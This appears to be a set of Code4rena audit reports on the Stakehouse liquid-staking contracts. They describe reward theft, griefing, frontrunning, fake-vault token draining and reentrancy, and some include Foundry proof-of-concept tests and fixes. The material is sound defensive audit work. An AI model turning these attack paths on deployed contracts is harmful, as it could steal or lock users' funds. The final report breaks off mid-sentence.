# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L172 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantLP.sol#L8   # Vulnerability details  ## Impact Any malicious user could make the rewards in GiantMevAndFeesPool inaccessible to all other users...  ## Proof of Concept  https://gist.github.com/clems4ever/9b05391cc2192c1b6e8178faa38dfe41  Copy the file in the test suite and run the test.  ## Tools Used  forge test  ## Recommended Mitigation Steps  Protect the inherited functions of the ERC20 tokens (GiantLP and LPToken) because `transfer` is not protected and can trigger the `before` and `after` hooks. There is the same issue with LPToken and StakingFundsVault.
# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L85 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L61 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L203   # Vulnerability details  ## Impact Any user being the first to claim rewards from GiantMevAndFeesPool, can get all the previously generated rewards whatever the amount and even if he did not participate to generate those rewards...  ## Proof of Concept  https://gist.github.com/clems4ever/c9fe06ce454ff6c4124f4bd29d3598de  Copy paste it in the test suite and run it.  ## Tools Used  forge test  ## Recommended Mitigation Steps  Rework the way `accumulatedETHPerLPShare` and `claimed` is used. There are multiple bugs due to the interaction between those variables as you will see in my other reports.
# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/ETHPoolLPFactory.sol#L111   # Vulnerability details  ## Description  Interaction with SavETHVault and StakingFundsVault require a minimum amount of MIN_STAKING_AMOUNT. In order to be used for staking, there needs to be 24 ETH or 4 ETH for the desired BLS public key in those vaults. The issue is that vaults can be griefed and made impossible to use for depositing by constantly making sure the *remaining* amount to be added to complete the deposit to the maxStakingAmountPerValidator, is under MIN_STAKING_AMOUNT.  In \_depositETHForStaking: ``` function _depositETHForStaking(bytes calldata _blsPublicKeyOfKnot, uint256 _amount, bool _enableTransferHook) internal {     require(_amount >= MIN_STAKING_AMOUNT, "Min amount not reached");     require(_blsPublicKeyOfKnot.length == 48, "Invalid BLS public key");     // LP token issued for the KNOT     // will be zero for a new KNOT because the mapping doesn't exist     LPToken lpToken = lpTokenForKnot[_blsPublicKeyOfKnot];     if(address(lpToken) != address(0)) {         // KNOT and it's LP token is already registered         // mint the respective LP tokens for the user         // total supply after minting the LP token must not exceed maximum staking amount per validator         require(lpToken.totalSupply() + _amount <= maxStakingAmountPerValidator, "Amount exceeds the staking limit for the validator");         // mint LP tokens for the depoistor with 1:1 ratio of LP tokens and ETH supplied         lpToken.mint(msg.sender, _amount);         emit LPTokenMinted(_blsPublicKeyOfKnot, address(lpToken), msg.sender, _amount);     }     else {           // check that amount doesn't exceed max staking amount per validator         require(_amount <= maxStakingAmountPerValidator, "Amount exceeds the staking limit for the validator");     ...      ```   MED - Can grief vaults (SavETHVault, StakingFundsVault) and make them not able to be used for staking by depositing so that left to stake is < MIN_STAKING_AMOUNT. Then it will fail maxStakingAmount check @ _depositEthForStaking  ## Impact  Vaults can be griefed to not be able to be used for deposits  ## Proof of Concept  1. savETHVault has 22 ETH for some validator 2. Attacker deposits 1.9991 ETH to the savETHVault 3. vault now has 23.9991 ETH. The remaining to complete to 24 is 0.0009 ETH which is under 0.001 ether, min staking amount 4. No one can complete the staking  Note that depositers may try to remove their ETH and redeposit it to complete the deposit to 24. However attack may still keep the delta just under MIN_STAKING_AMOUNT.  ## Tools Used  Manual audit  ## Recommended Mitigation Steps  Handle the case where the remaining amount to be completed is smaller than MIN_STAKING_AMOUNT, and allow the deposit in that case.
# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L224   # Vulnerability details  ## Description  StakingFundsVault has the claimRewards() function to allow users to withdraw profits.  ``` function claimRewards(     address _recipient,     bytes[] calldata _blsPubKeys ) external nonReentrant {     for (uint256 i; i < _blsPubKeys.length; ++i) {         require(             liquidStakingNetworkManager.isBLSPublicKeyBanned(_blsPubKeys[i]) == false,             "Unknown BLS public key"         );         // Ensure that the BLS key has its derivatives minted         require(             getAccountManager().blsPublicKeyToLifecycleStatus(_blsPubKeys[i]) == IDataStructures.LifecycleStatus.TOKENS_MINTED,             "Derivatives not minted"         );         if (i == 0 && !Syndicate(payable(liquidStakingNetworkManager.syndicate())).isNoLongerPartOfSyndicate(_blsPubKeys[i])) {             // Withdraw any ETH accrued on free floating SLOT from syndicate to this contract             // If a partial list of BLS keys that have free floating staked are supplied, then partial funds accrued will be fetched             _claimFundsFromSyndicateForDistribution(                 liquidStakingNetworkManager.syndicate(),                 _blsPubKeys             );             // Distribute ETH per LP             updateAccumulatedETHPerLP();         }         // If msg.sender has a balance for the LP token associated with the BLS key, then send them any accrued ETH         LPToken token = lpTokenForKnot[_blsPubKeys[i]];         require(address(token) != address(0), "Invalid BLS key");         require(token.lastInteractedTimestamp(msg.sender) + 30 minutes < block.timestamp, "Last transfer too recent");         _distributeETHRewardsToUserForToken(msg.sender, address(token), token.balanceOf(msg.sender), _recipient);     } } ```  The issue is that updateAccumulatedETHPerLP() is not guaranteed to be called, which means the ETH reward distribution in \_distribute would use stale value, and users will not receive as many rewards as they should. `updateAccumulatedETHPerLP` is only called if the first BLS public key is part of the syndicate. However, for the other keys it makes no reason not to use the up to date accumulatedETHPerLPShare value.  ## Impact  User receives less rewards than they are eligible for if first passed BLS key is inactive.  ## Tools Used  Manual audit  ## Recommended Mitigation Steps  Call updateAccumulatedETHPerLP() at the start of the function.
# Lines of code   https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L218   # Vulnerability details  ## Description  claimRewards in StakingFundsVault.sol has this code: ``` if (i == 0 && !Syndicate(payable(liquidStakingNetworkManager.syndicate())).isNoLongerPartOfSyndicate(_blsPubKeys[i])) {     // Withdraw any ETH accrued on free floating SLOT from syndicate to this contract     // If a partial list of BLS keys that have free floating staked are supplied, then partial funds accrued will be fetched     _claimFundsFromSyndicateForDistribution(         liquidStakingNetworkManager.syndicate(),         _blsPubKeys     );     // Distribute ETH per LP     updateAccumulatedETHPerLP(); } ```  The issue is that if the first BLS public key is not part of the syndicate, then \_claimFundsFromSyndicateForDistribution will not be called, even on BLS keys that are eligible for syndicate rewards. This leads to reduced rewards for user.  This is different from a second bug which discusses the possibility of using a stale acculmulatedETHPerLP.  ## Impact  Users will not receive rewards for claims of valid public keys if first passed key is not part of syndicate.  ## Tools Used  Manual audit  ## Recommended Mitigation Steps  Drop the i==0 requirement, which was intended to make sure the claim isn't called multiple times. Use a hasClaimed boolean instead.
# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L356 https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L369   # Vulnerability details  ## Impact As the `rotateNodeRunnerOfSmartWallet` function can be called by anyone who is a node runner in the LSD network, this function is vulnerable to a frontrun attack in the case of this node runner being malicious.  ## Proof of Concept If that is the current node runner is malicious, the DAO would purposely call this same `rotateNodeRunnerOfSmartWallet` with the `_wasPreviousNodeRunnerMalicious` flag turned on. An actual node runner that has been malicious could monitor the mempool and frontrun the DAO transaction that wanted to slash it and submit the transaction before the DAO to avoid getting banned and rotate their EOA representation of the node.  ```solidity if (msg.sender == dao && _wasPreviousNodeRunnerMalicious) {     bannedNodeRunners[_current] = true;     emit NodeRunnerBanned(_current); } ```  When the DAO transaction would go through, it would revert when it's checking if the current (old) node representative is still a wallet, but it's not because the mapping value has been deleted before.  ```solidity address wallet = smartWalletOfNodeRunner[_current]; require(wallet != address(0), "Wallet does not exist"); ```  ## Tools Used Manual inspection  ## Recommended Mitigation Steps Restrict this function to DAO only with the `onlyDAO` modifier.  ```solidity // - function rotateNodeRunnerOfSmartWallet(address _current, address _new, bool _wasPreviousNodeRunnerMalicious) external { + function rotateNodeRunnerOfSmartWallet(address _current, address _new, bool _wasPreviousNodeRunnerMalicious) onlyDAO external {     require(_new != address(0) && _current != _new, "New is zero or current");      address wallet = smartWalletOfNodeRunner[_current];     require(wallet != address(0), "Wallet does not exist");     require(_current == msg.sender || dao == msg.sender, "Not current owner or DAO");      address newRunnerCurrentWallet = smartWalletOfNodeRunner[_new];     require(newRunnerCurrentWallet == address(0), "New runner has a wallet");      smartWalletOfNodeRunner[_new] = wallet;     nodeRunnerOfSmartWallet[wallet] = _new;      delete smartWalletOfNodeRunner[_current];      // - if (msg.sender == dao && _wasPreviousNodeRunnerMalicious) {     if (_wasPreviousNodeRunnerMalicious) {         bannedNodeRunners[_current] = true;         emit NodeRunnerBanned(_current);     }      emit NodeRunnerOfSmartWalletRotated(wallet, _current, _new); }
# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L93-L97   # Vulnerability details  ## Impact The batch operations of `withdrawDETH()` in GiantSavETHVaultPool.sol and `withdrawLPTokens()` in GiantPoolBase.sol are meaningless because they will fail whenever more than one lpToken is passed. Each user can perform `withdrawDETH()` or `withdrawLPTokens()` with one LPToken only once a day.  ## Proof of Concept  Both the `withdrawDETH()` in GiantSavETHVaultPool.sol and `withdrawLPTokens()` in GiantPoolBase.sol will call `GiantPoolBase._assertUserHasEnoughGiantLPToClaimVaultLP(lpToken, amount)` and `lpTokenETH.burn(msg.sender, amount)`:  There is a require in `_assertUserHasEnoughGiantLPToClaimVaultLP()`: ``` require(lpTokenETH.lastInteractedTimestamp(msg.sender) + 1 days < block.timestamp, "Too new"); ```  At the same time, `lpTokenETH.burn(msg.sender, amount)` will update `lastInteractedTimestamp[msg.sender]` to latest block timestamp in `_afterTokenTransfer()` of GiantLP.sol.  So, a user can perform `withdrawDETH` or `withdrawLPTokens` of one LPToken only once a day, others more will fail by `_assertUserHasEnoughGiantLPToClaimVaultLP()`.  ## Tools Used VS Code  ## Recommended Mitigation Steps  The LPToken being operated on should be checked for lastInteractedTimestamp rather than lpTokenETH.  ``` diff --git a/contracts/liquid-staking/GiantPoolBase.sol b/contracts/liquid-staking/GiantPoolBase.sol index 8a8ff70..5c009d9 100644 --- a/contracts/liquid-staking/GiantPoolBase.sol +++ b/contracts/liquid-staking/GiantPoolBase.sol @@ -93,7 +93,7 @@ contract GiantPoolBase is ReentrancyGuard {      function _assertUserHasEnoughGiantLPToClaimVaultLP(LPToken _token, uint256 _amount) internal view {          require(_amount >= MIN_STAKING_AMOUNT, "Invalid amount");          require(_token.balanceOf(address(this)) >= _amount, "Pool does not own specified LP"); -        require(lpTokenETH.lastInteractedTimestamp(msg.sender) + 1 days < block.timestamp, "Too new"); +        require(_token.lastInteractedTimestamp(msg.sender) + 1 days < block.timestamp, "Too new");      }       /// @dev Allow an inheriting contract to have a hook for performing operations post depositing ETH ```  
# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L356-L377 https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L507-L509 https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L426-L492   # Vulnerability details  ## Impact Currently, the `rotateNodeRunnerOfSmartWallet` function provides the only way to set `bannedNodeRunners` to `true` for a malicious node runner. However, before the node runner calls the `registerBLSPublicKeys` function to create a smart wallet, calling the `rotateNodeRunnerOfSmartWallet` function reverts. This means that for a node runner, who is already known to be malicious such as someone controlling a hacker address, calling the `isNodeRunnerBanned` function always return `false` before the `registerBLSPublicKeys` function is called for the first time, and executing `require(isNodeRunnerBanned(msg.sender) == false, "Node runner is banned from LSD network")` when calling the `registerBLSPublicKeys` function for the first time is not effective. As the monitoring burden can be high, the malicious node runner could interact with the protocol maliciously for a while already after the `registerBLSPublicKeys` function is called until the DAO notices the malicious activities and then calls the `rotateNodeRunnerOfSmartWallet` function. When the DAO does not react promptly, some damages to the protocol could be done already.  https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L356-L377 ```solidity     function rotateNodeRunnerOfSmartWallet(address _current, address _new, bool _wasPreviousNodeRunnerMalicious) external {         ...          if (msg.sender == dao && _wasPreviousNodeRunnerMalicious) {             bannedNodeRunners[_current] = true;             emit NodeRunnerBanned(_current);         }          ...     } ```  https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L507-L509 ```solidity     function isNodeRunnerBanned(address _nodeRunner) public view returns (bool) {         return bannedNodeRunners[_nodeRunner];     } ```  https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L426-L492 ```solidity     function registerBLSPublicKeys(         bytes[] calldata _blsPublicKeys,         bytes[] calldata _blsSignatures,         address _eoaRepresentative     ) external payable nonReentrant {         ...         require(isNodeRunnerBanned(msg.sender) == false, "Node runner is banned from LSD network");          address smartWallet = smartWalletOfNodeRunner[msg.sender];          if(smartWallet == address(0)) {             // create new wallet owned by liquid staking manager             smartWallet = smartWalletFactory.createWallet(address(this));             emit SmartWalletCreated(smartWallet, msg.sender);              // associate node runner with the newly created wallet             smartWalletOfNodeRunner[msg.sender] = smartWallet;             nodeRunnerOfSmartWallet[smartWallet] = msg.sender;              _authorizeRepresentative(smartWallet, _eoaRepresentative, true);         }          ...     } ```  ## Proof of Concept Please add the following test in `test\foundry\LSDNFactory.t.sol`. This test will pass to demonstrate the described scenario. ```solidity     function testMaliciousNodeRunnerCannotBeBannedBeforeCorrespondingSmartWalletIsCreated() public {         vm.prank(address(factory));         manager.updateDAOAddress(admin);          // Simulate a situation where accountOne is known to be malicious already.         // accountOne is not banned at this moment.         assertEq(manager.bannedNodeRunners(accountOne), false);          // Calling the rotateNodeRunnerOfSmartWallet function is the only way to ban accountOne;         //   however, calling it reverts because accountOne has not called the registerBLSPublicKeys function to create a smart wallet yet.         // This means that it is not possible to prevent accountOne from interacting with the protocol until her or his smart wallet is created.         vm.prank(admin);         vm.expectRevert("Wallet does not exist");         manager.rotateNodeRunnerOfSmartWallet(accountOne, accountTwo, true);     } ```  ## Tools Used VSCode  ## Recommended Mitigation Steps A function, which should be only callable by the DAO, that can directly set `bannedNodeRunners` for a node runner can be added.
# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L278-L284 https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L684-L692 https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L426-L492   # Vulnerability details  ## Impact Calling the `updateNodeRunnerWhitelistStatus` function by the DAO supposes to allow the trusted node runners to use and interact with the protocol when `enableWhitelisting` is set to `true`. However, since calling the `updateNodeRunnerWhitelistStatus` function executes `require(isNodeRunnerWhitelisted[_nodeRunner] != isNodeRunnerWhitelisted[_nodeRunner], "Unnecessary update to same status")`, which always reverts, the DAO is unable to whitelist any trusted node runners. Because none of them can be whitelisted, all trusted node runners cannot call functions like `registerBLSPublicKeys` when the whitelisting mode is enabled. As the major functionalities become unavailable, the protocol's usability becomes much limited, and the user experience becomes much degraded.  https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L278-L284 ```solidity     function updateNodeRunnerWhitelistStatus(address _nodeRunner, bool isWhitelisted) external onlyDAO {         require(_nodeRunner != address(0), "Zero address");         require(isNodeRunnerWhitelisted[_nodeRunner] != isNodeRunnerWhitelisted[_nodeRunner], "Unnecessary update to same status");          isNodeRunnerWhitelisted[_nodeRunner] = isWhitelisted;         emit NodeRunnerWhitelistingStatusChanged(_nodeRunner, isWhitelisted);     } ```  https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L684-L692 ```solidity     function _isNodeRunnerValid(address _nodeRunner) internal view returns (bool) {         require(_nodeRunner != address(0), "Zero address");          if(enableWhitelisting) {             require(isNodeRunnerWhitelisted[_nodeRunner] == true, "Invalid node runner");         }          return true;     } ```  https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L426-L492 ```solidity     function registerBLSPublicKeys(         bytes[] calldata _blsPublicKeys,         bytes[] calldata _blsSignatures,         address _eoaRepresentative     ) external payable nonReentrant {         ...         require(_isNodeRunnerValid(msg.sender) == true, "Unrecognised node runner");         ...     } ```  ## Proof of Concept Please add the following test in `test\foundry\LSDNFactory.t.sol`. This test will pass to demonstrate the described scenario. ```solidity     function testCallingUpdateNodeRunnerWhitelistStatusFunctionAlwaysReverts() public {         vm.prank(address(factory));         manager.updateDAOAddress(admin);          vm.startPrank(admin);          vm.expectRevert("Unnecessary update to same status");         manager.updateNodeRunnerWhitelistStatus(accountOne, true);          vm.expectRevert("Unnecessary update to same status");         manager.updateNodeRunnerWhitelistStatus(accountTwo, false);          vm.stopPrank();     } ```  ## Tools Used VSCode  ## Recommended Mitigation Steps https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L280 can be updated to the following code.  ```solidity         require(isNodeRunnerWhitelisted[_nodeRunner] != isWhitelisted, "Unnecessary update to same status"); ```
# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L202-L215 https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/smart-wallet/OwnableSmartWallet.sol#L52-L64   # Vulnerability details  ## Impact Calling the `executeAsSmartWallet` function by the DAO further calls the `OwnableSmartWallet.execute` function. Since the `executeAsSmartWallet` function is `payable`, an ETH amount can be sent when calling it. However, since the sent ETH amount is not forwarded to the smart wallet contract, such sent amount can become locked in the `LiquidStakingManager` contract. For example, when the DAO attempts to call the `executeAsSmartWallet` function for sending some ETH to the smart wallet so the smart wallet can use it when calling its `execute` function, if the smart wallet's ETH balance is also higher than this sent ETH amount, calling the `executeAsSmartWallet` function would not revert, and the sent ETH amount is locked in the `LiquidStakingManager` contract while such amount is deducted from the smart wallet's ETH balance for being sent to the target address. Besides that this is against the intention of the DAO, the DAO loses the sent ETH amount that becomes locked in the `LiquidStakingManager` contract, and the node runner loses the amount that is unexpectedly deducted from the corresponding smart wallet's ETH balance.  https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L202-L215 ```solidity     function executeAsSmartWallet(         address _nodeRunner,         address _to,         bytes calldata _data,         uint256 _value     ) external payable onlyDAO {         address smartWallet = smartWalletOfNodeRunner[_nodeRunner];         require(smartWallet != address(0), "No wallet found");         IOwnableSmartWallet(smartWallet).execute(             _to,             _data,             _value         );     } ```  https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/smart-wallet/OwnableSmartWallet.sol#L52-L64 ```solidity     function execute(         address target,         bytes memory callData,         uint256 value     )         external         override         payable         onlyOwner // F: [OSW-6A]         returns (bytes memory)     {         return target.functionCallWithValue(callData, value); // F: [OSW-6]     } ```  ## Proof of Concept Please add the following code in `test\foundry\LSDNFactory.t.sol`.  1. Add the following `receive` function for the POC purpose. ```solidity     receive() external payable {} ```  2. Add the following test. This test will pass to demonstrate the described scenario. ```solidity     function testETHSentWhenCallingExecuteAsSmartWalletFunctionCanBeLost() public {         vm.prank(address(factory));         manager.updateDAOAddress(admin);          uint256 nodeStakeAmount = 4 ether;         address nodeRunner = accountOne;         vm.deal(nodeRunner, nodeStakeAmount);          address eoaRepresentative = accountTwo;          vm.prank(nodeRunner);         manager.registerBLSPublicKeys{value: nodeStakeAmount}(             getBytesArrayFromBytes(blsPubKeyOne),             getBytesArrayFromBytes(blsPubKeyOne),             eoaRepresentative         );          // Before the executeAsSmartWallet function is called, the manager contract owns 0 ETH,         //   and nodeRunner's smart wallet owns 4 ETH.          assertEq(address(manager).balance, 0);         assertEq(manager.smartWalletOfNodeRunner(nodeRunner).balance, 4 ether);          uint256 amount = 1.5 ether;          vm.deal(admin, amount);          vm.startPrank(admin);          // admin, who is dao at this moment, calls the executeAsSmartWallet function while sending 1.5 ETH         manager.executeAsSmartWallet{value: amount}(nodeRunner, address(this), bytes(""), amount);          vm.stopPrank();          // Although admin attempts to send the 1.5 ETH through calling the executeAsSmartWallet function,         //   the sent 1.5 ETH was not transferred to nodeRunner's smart wallet but is locked in the manager contract instead.         assertEq(address(manager).balance, amount);          // Because nodeRunner's smart wallet owns more than 1.5 ETH, 1.5 ETH of this smart wallet's ETH balance is actually sent to address(this).         assertEq(manager.smartWalletOfNodeRunner(nodeRunner).balance, 4 ether - amount);     } ```  ## Tools Used VSCode  ## Recommended Mitigation Steps https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L210-L214 can be updated to the following code.  ```solidity         IOwnableSmartWallet(smartWallet).execute{value: msg.value}(             _to,             _data,             _value         ); ```
# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L126   # Vulnerability details  ## Impact real `LPTokens` can be transferred out of `GiantMevAndFeesPool` through fake `_stakingFundsVaults` provided by an attacker. https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L126  ## Proof of Concept `bringUnusedETHBackIntoGiantPool` takes in `_stakingFundsVaults`, `_oldLPTokens`, `_newLPTokens` and rotate `_amounts` from old to new tokens. The tokens are thoroughly verified by `burnLPForETH` in `ETHPoolLPFactory`.  However, theres is no checking for the validity of `_stakingFundsVaults`, nor the relationship between `LPTokens` and `_stakingFundsVaults`. Therefore, an attacker can create fake contracts for `_stakingFundsVaults`, with `burnLPTokensForETH`, that takes `LPTokens` as parameters. The `msg.sender` in `burnLPTokensForETH` is `GiantMevAndFeesPool`, thus the attacker can transfer `LPTokens` that belongs to `GiantMevAndFeesPool` to any addresses it controls.  ## Tools Used manual  ## Recommended Mitigation Steps Always passing liquid staking manager address, checking its real and then requesting either the savETH vault or staking funds vault is a good idea to prove the validity of vaults.  
# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L51-L73 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L146-L167 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L66-L90 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L66-L104 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L110-L143 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L314-L340   # Vulnerability details  ### Author: rotcivegaf  ### Impact  The root of the problem are in the `_distributeETHRewardsToUserForToken` who makes a call to distribute the ether rewards. With this call the recipient can execute an reentrancy attack calling several times the different function to steal founds or take advantage of other users/protocol  ### Proof of Concept  This functions use the `_distributeETHRewardsToUserForToken`:  #### [`beforeTokenTransfer`, **GiantMevAndFeesPool** contract](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L146-L167):  The contract **GiantLP** use the **GiantMevAndFeesPool** contract as [`transferHookProcessor`](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantLP.sol#L14) and when use the functions [`_mint`, `_burn`, `transferFrom` and `transfer` of the ERC20](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v4.7/contracts/token/ERC20/ERC20.sol), the function [`beforeTokenTransfer`](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L146-L167) implemented in the **GiantMevAndFeesPool** bring a possibility to make a reentrancy attack because in the function [`_distributeETHRewardsToUserForToken`](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L51-L73) implemented in the [**GiantMevAndFeesPool** make a `call` to the `_recipient`](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L67-L68)  A contract can call the function `transfer` of **GiantLP** contract several time, transfer an `amount` from and to self, as the update of the [`claimed`](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L203) would not be done until, it is executed the function [`_afterTokenTransfer`](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantLP.sol#L43-L47) of the **GiantLP** contract, the [`due`](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L61) amount calculated in `_distributeETHRewardsToUserForToken` of **SyndicateRewardsProcessor** contract and the `lastInteractedTimestamp` of **GiantLP** contract will be incorrect  ### [`withdrawLPTokens`, **GiantPoolBase** contract](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L66-L90):  The possibility of the reentrancy is given when call function [`_onWithdraw`](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L74), this function implemented in [**GiantMevAndFeesPool** contract](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L181-L193) uses `_distributeETHRewardsToUserForToken` and this one call the recipient making the possibility of the reentrancy, breaking the code of [L76-L89](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L76-L89)  ### [`batchDepositETHForStaking`, **StakingFundsVault** contract](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L66-L104):  The possibility of the reentrancy is given when call function [`_distributeETHRewardsToUserForToken`](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L88-L93), this function call the recipient making the possibility of the reentrancy, breaking the code of [L76-L89](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L96-L107)  ### [`depositETHForStaking`, **StakingFundsVault** contract](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L110-L143):  The possibility of the reentrancy is given when call function [`_distributeETHRewardsToUserForToken`](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L128-L133), this function call the recipient making the possibility of the reentrancy, breaking the code of [L136-L142](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L136-L142)  ### [`beforeTokenTransfer`, **StakingFundsVault** contract](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L314-L340):  The possibility of the reentrancy is given when call function `_distributeETHRewardsToUserForToken` in [L333](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L333) and [L337](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L337), this function call the recipient making the possibility of the reentrancy, breaking the code of [L343-L351](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L343-L351)  ### Tools Used  Review  ### Recommended Mitigation Steps  One possibility its wrap(`deposit`) ether in WETH and transfer as ERC20 token  Another, it's add `nonReentrant` guard to the 